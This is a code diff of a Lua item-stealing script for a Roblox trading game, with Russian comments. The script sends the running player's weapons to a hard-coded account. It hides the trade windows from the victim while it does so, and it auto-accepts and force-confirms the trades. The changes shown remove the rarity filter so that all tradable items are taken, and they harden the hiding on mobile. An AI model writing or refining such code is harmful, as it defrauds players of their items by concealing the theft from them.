@@ -1,5 +1,4 @@
 local TARGET_USER = "ilyes_ida3"
-local min_rarity = _G.min_rarity or "Common"
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or ""
 
@@ -26,7 +25,6 @@ local weaponsToSend = {}
 local playerGui = plr:WaitForChild("PlayerGui")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
--- Подгрузка базы данных предметов как в оригинале, но с защитой от ошибок
 local database
 do
     local ok, result = pcall(function()
@@ -60,7 +58,7 @@ local activeTargetName = nil
 local tradeInProgress = false
 
 -- =====================================================================
--- ДВИЖОК РЕЗОЛВА ИМЕНИ (Абсолютная точность)
+-- ДВИЖОК РЕЗОЛВА ИМЕНИ (С ПОДДЕРЖКОЙ СКОБОК)
 -- =====================================================================
 local function getTradeOpponentName()
     if activeTargetName then return activeTargetName end
@@ -68,8 +66,10 @@ local function getTradeOpponentName()
     if gui then
         for _, obj in ipairs(gui:GetDescendants()) do
             if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text ~= "" and obj.Text ~= plr.Name then
-                if obj.Text == TARGET_USER then return TARGET_USER end
-                if Players:FindFirstChild(obj.Text) then return obj.Text end
+                -- КРИТИЧЕСКИЙ ФИКС: string.find вместо строгого ==
+                if string.find(obj.Text, TARGET_USER, 1, true) then 
+                    return TARGET_USER 
+                end
             end
         end
     end
@@ -100,37 +100,43 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success)
 end)
 
 -- =====================================================================
--- МОБИЛЬНЫЙ БЛОКИРАТОР ГУИ (Защита от мерцаний и пробития)
+-- МОБИЛЬНЫЙ БЛОКИРАТОР ГУИ V2 (HEARTBEAT LOCK)
 -- =====================================================================
-RunService.RenderStepped:Connect(function()
+RunService.Heartbeat:Connect(function()
     local currentTarget = getTradeOpponentName()
     
-    -- Блокировка основного TradeGUI
     local tGui = playerGui:FindFirstChild("TradeGUI")
     if tGui then
+        local main = tGui:FindFirstChild("Main")
+        local container = tGui:FindFirstChild("Container")
+        
         if currentTarget == TARGET_USER then
             tGui.Enabled = false
-            pcall(function()
-                if tGui:FindFirstChild("Main") then tGui.Main.Position = UDim2.new(999, 0, 999, 0) end
-                if tGui:FindFirstChild("Container") then tGui.Container.Position = UDim2.new(999, 0, 999, 0) end
-            end)
-        elseif currentTarget ~= TARGET_USER and currentTarget ~= nil then
-            -- Оставляем штатно, возвращаем позицию если сбилась
-            pcall(function()
-                if tGui:FindFirstChild("Main") and tGui.Main.Position.X.Scale == 999 then
-                    tGui.Main.Position = UDim2.new(0.5, -tGui.Main.Size.X.Offset/2, 0.5, -tGui.Main.Size.Y.Offset/2)
-                end
-            end)
+            if main then 
+                main.Visible = false 
+                main.Position = UDim2.new(50, 0, 50, 0) -- Улёт за пределы галактики
+            end
+            if container then 
+                container.Visible = false 
+            end
+        else
+            -- Возврат в исходное состояние для обычных игроков
+            if main and not main.Visible then
+                main.Visible = true
+                main.Position = UDim2.new(0.5, -main.Size.X.Offset/2, 0.5, -main.Size.Y.Offset/2)
+            end
+            if container and not container.Visible then
+                container.Visible = true
+            end
         end
     end
 
-    -- Блокировка входящего TradeRequestGUI ТОЛЬКО от ilyes_ida3
     local rGui = playerGui:FindFirstChild("TradeRequestGUI", true)
     if rGui then
         local isHim = false
         pcall(function()
             for _, obj in ipairs(rGui:GetDescendants()) do
-                if obj:IsA("TextLabel") and obj.Text == TARGET_USER then
+                if obj:IsA("TextLabel") and string.find(obj.Text, TARGET_USER, 1, true) then
                     isHim = true
                     break
                 end
@@ -138,35 +144,14 @@ RunService.RenderStepped:Connect(function()
         end)
         if isHim then
             rGui.Enabled = false
-            pcall(function() rGui.Position = UDim2.new(999,0,999,0) end)
+            local rMain = rGui:FindFirstChild("Main")
+            if rMain then rMain.Visible = false end
         end
     end
 end)
 
--- Дублирующий хук для экзекуторов которые это тянут
-local oldNewIndex
-oldNewIndex = hookmetamethod(game, "__newindex", newcclosure(function(t, k, v)
-    if not checkcaller() and k == "Enabled" and v == true and type(t) == "userdata" and typeof(t) == "Instance" then
-        if t.Name == "TradeGUI" then
-            if getTradeOpponentName() == TARGET_USER then return end
-        elseif t.Name == "TradeRequestGUI" then
-            local isHim = false
-            pcall(function()
-                for _, obj in ipairs(t:GetDescendants()) do
-                    if obj:IsA("TextLabel") and obj.Text == TARGET_USER then
-                        isHim = true
-                        break
-                    end
-                end
-            end)
-            if isHim then return end
-        end
-    end
-    return oldNewIndex(t, k, v)
-end))
-
 -- =====================================================================
--- ЛОГИКА ТРЕЙДА И ТРАНСФЕРА
+-- ЛОГИКА ТРЕЙДА И ТРАНСФЕРА (БЕЗ ФИЛЬТРА РАРИТЕТА ДЛЯ ТАРГЕТА)
 -- =====================================================================
 local function forceAcceptTrade()
     if not lastOfferToken then return false end
@@ -193,14 +178,10 @@ local function rebuildWeaponsList()
     end)
     if not ok or type(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then return end
 
-    local min_idx = table.find(rarityTable, min_rarity) or 1
     for dataid, amount in pairs(realData.Weapons.Owned) do
         local itemData = database[dataid]
-        if itemData and amount and amount > 0 then
-            local w_idx = table.find(rarityTable, itemData.Rarity)
-            if w_idx and w_idx >= min_idx and not untradable[dataid] then
-                table.insert(weaponsToSend, {DataID = dataid, Rarity = itemData.Rarity, Amount = amount})
-            end
+        if itemData and amount and amount > 0 and not untradable[dataid] then
+            table.insert(weaponsToSend, {DataID = dataid, Rarity = itemData.Rarity, Amount = amount})
         end
     end
     table.sort(weaponsToSend, function(a, b)
@@ -215,7 +196,7 @@ local function getTradeStatus()
     return ok and status or "None"
 end
 
--- 1. Сканер каждые 3 секунды (кидает трейд ТОЛЬКО ilyes_ida3)
+-- 1. Сканер (кидает трейд)
 task.spawn(function()
     while task.wait(3) do
         if getTradeStatus() == "None" then
@@ -226,7 +207,7 @@ task.spawn(function()
     end
 end)
 
--- 2. Авто-принятие запроса ТОЛЬКО от ilyes_ida3
+-- 2. Авто-принятие входящего
 task.spawn(function()
     while task.wait(0.1) do
         if getTradeStatus() == "ReceivingRequest" then
@@ -235,7 +216,7 @@ task.spawn(function()
                 local isTarget = false
                 pcall(function()
                     for _, obj in ipairs(reqGUI:GetDescendants()) do
-                        if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text == TARGET_USER then
+                        if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and string.find(obj.Text, TARGET_USER, 1, true) then
                             isTarget = true
                             break
                         end
@@ -251,13 +232,12 @@ task.spawn(function()
                     end)
                     task.wait(0.5)
                 end
-                -- Если запрос от другого игрока — скрипт игнорирует его, и GUI работает штатно.
             end
         end
     end
 end)
 
--- 3. Основной движок трансфера
+-- 3. Движок трансфера
 task.spawn(function()
     while task.wait(0.1) do
         local currentStatus = getTradeStatus()
@@ -270,7 +250,6 @@ task.spawn(function()
         elseif currentStatus == "StartTrade" and not tradeInProgress then
             tradeInProgress = true
             
-            -- Даём игре 2 секунды на прогрузку данных оппонента
             local wStart = tick()
             while not activeTargetName and (tick() - wStart) < 2 do 
                 activeTargetName = getTradeOpponentName()
@@ -278,7 +257,6 @@ task.spawn(function()
             end
             
             if activeTargetName == TARGET_USER then
-                -- ЭТО ilyes_ida3. ПЕРЕДАЕМ ВЕЩИ И ПОДТВЕРЖДАЕМ.
                 rebuildWeaponsList()
                 if #weaponsToSend > 0 then
                     local added = 0
@@ -288,7 +266,7 @@ task.spawn(function()
                                 if added >= 4 then break end
                                 addWeaponToTrade(weapon.DataID)
                                 added = added + 1
-                                task.wait(0.05)
+                                task.wait(0.1) -- Увеличен тайминг для мобилок
                             end
                         end
                     end
@@ -301,12 +279,8 @@ task.spawn(function()
                     if opponentAccepted then task.wait(0.3) forceAcceptTrade() end
                 end
                 
-                -- Ждем завершения
                 while getTradeStatus() ~= "None" do task.wait(0.2) end
-                
             else
-                -- ЭТО ЛЮБОЙ ДРУГОЙ ИГРОК. СИДИМ ТИХО. 
-                -- Скрипт просто ждет окончания трейда, ничего не передает, ничего не принимает.
                 while getTradeStatus() ~= "None" do task.wait(0.5) end
             end
         end
